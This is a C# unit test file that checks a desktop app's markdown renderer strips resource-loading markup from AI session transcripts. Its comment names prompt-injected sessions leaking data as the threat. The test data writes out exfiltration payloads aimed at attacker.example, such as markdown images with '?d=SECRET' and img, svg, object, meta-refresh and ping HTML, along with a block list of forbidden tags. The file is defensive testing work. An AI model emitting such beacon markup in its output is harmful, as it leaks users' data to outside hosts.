using System.Text.RegularExpressions;
using TessynDesktop.Models.Remote;
using TessynDesktop.WPF.Rendering;
using TessynDesktop.WPF.Services;

namespace TessynDesktop.WPF.Tests;

/// <summary>
/// With the transcript CSP allowing https images and media, markdown must never produce an element that can load a resource (a
/// prompt-injected session could otherwise leak data with no click). Media only come through the gated preview path. The same
/// renderer serves the preview pane, so these tests cover it too.
/// </summary>
/// <remarks>Created by Claude</remarks>
public sealed class MarkdownNoRemoteResourceTests
{
	private static readonly string[] ForbiddenTags = ["img", "video", "audio", "source", "picture", "svg", "math", "object", "embed", "link", "meta", "track"];
	private static readonly string[] ForbiddenAttributes = ["srcset", "background", "poster", "ping", "src"];

	private readonly MarkdigEntryRenderer _renderer = new(new UrlPolicy(), new MediaLinkDetector(new MediaPreviewPolicy()), new LocalPathDetector());

	private static void AssertNoResourceMarkup(string html)
	{
		foreach (var tag in ForbiddenTags)
			Assert.DoesNotMatch(new Regex($@"<{tag}\b", RegexOptions.IgnoreCase), html);
		foreach (var attribute in ForbiddenAttributes)
			Assert.DoesNotMatch(new Regex($@"<[^>]*\s{attribute}\s*=", RegexOptions.IgnoreCase), html);
	}

	[Fact]
	public void AMarkdownImageToANonAllowlistedHost_ProducesNoElementWithARemoteUrl()
	{
		var html = _renderer.RenderMarkdown("![](https://attacker.example/p.png?d=SECRET) and ![chart](https://attacker.example/c.png?d=SECRET)");

		AssertNoResourceMarkup(html);
		Assert.DoesNotContain("attacker.example", html);
		Assert.DoesNotContain("SECRET", html);
		Assert.Contains("chart", html);       // alt text stays
	}

	[Fact]
	public void AMarkdownImageToAnAllowlistedHost_IsStillNotAnElement()
	{
		var policy = new MediaPreviewPolicy();
		policy.SetHosts(["annielartens.online"]);
		var renderer = new MarkdigEntryRenderer(new UrlPolicy(), new MediaLinkDetector(policy));

		var html = renderer.RenderMarkdown("![r](https://annielartens.online/r/1.png)");

		AssertNoResourceMarkup(html);
		Assert.DoesNotContain("annielartens.online", html);   // media come only through the gated preview list, not the markdown
	}

	[Theory]
	[InlineData("<img src=\"https://attacker.example/p.png\">")]
	[InlineData("<img srcset=\"https://attacker.example/p.png 2x\">")]
	[InlineData("<video poster=\"https://attacker.example/p.png\" src=\"https://attacker.example/v.mp4\"></video>")]
	[InlineData("<audio src=\"https://attacker.example/a.mp3\"></audio>")]
	[InlineData("<picture><source srcset=\"https://attacker.example/p.png\"></picture>")]
	[InlineData("<svg><image href=\"https://attacker.example/p.png\"/></svg>")]
	[InlineData("<math><mi href=\"x\"/></math>")]
	[InlineData("<object data=\"https://attacker.example/x\"></object><embed src=\"https://attacker.example/x\">")]
	[InlineData("<link rel=\"stylesheet\" href=\"https://attacker.example/x.css\"><meta http-equiv=\"refresh\" content=\"0;url=https://attacker.example\">")]
	[InlineData("<track src=\"https://attacker.example/x.vtt\">")]
	[InlineData("<a href=\"https://example.com\" ping=\"https://attacker.example/ping\" style=\"background:url(https://attacker.example/b.png)\">x</a>")]
	[InlineData("<body background=\"https://attacker.example/b.png\">")]
	public void RawHtmlResourceMarkup_IsNeverLiveMarkup(string markdown)
	{
		var html = _renderer.RenderMarkdown(markdown);

		AssertNoResourceMarkup(html);
		Assert.DoesNotMatch(new Regex(@"<(?!a\s)[^>]*attacker\.example", RegexOptions.IgnoreCase), html);   // only escaped text or a plain link may mention it
	}

	[Fact]
	public void TheStripperRemovesResourceMarkupEvenIfAnElementSlippedThrough()
	{
		// Reflection-free check of the last line of defence: feed HTML through the same path via a link title and an autolink.
		var html = _renderer.RenderMarkdown("[x](https://example.com \"t\") <https://example.com/a> [y](https://example.com/p.png)");

		AssertNoResourceMarkup(html);
		Assert.Contains("href=\"https://example.com", html);   // ordinary links survive
	}

	[Fact]
	public void EntryRenderingKeepsMediaOnlyInTheGatedMediaList()
	{
		var entry = new SessionEntryDto
		{
			Index = 1, Role = "assistant", Timestamp = DateTimeOffset.UnixEpoch,
			Content = "![x](https://attacker.example/p.png?d=SECRET) see https://cdn.example.com/a.png",
		};

		var view = _renderer.Render(entry);

		AssertNoResourceMarkup(view.Html);
		Assert.DoesNotContain("attacker.example", view.Html);
		// Links to media are offered only through the gated list: click-to-load unless the host is allowlisted (none is here).
		Assert.Equal(["https://attacker.example/p.png?d=SECRET", "https://cdn.example.com/a.png"], view.Media);
	}
}
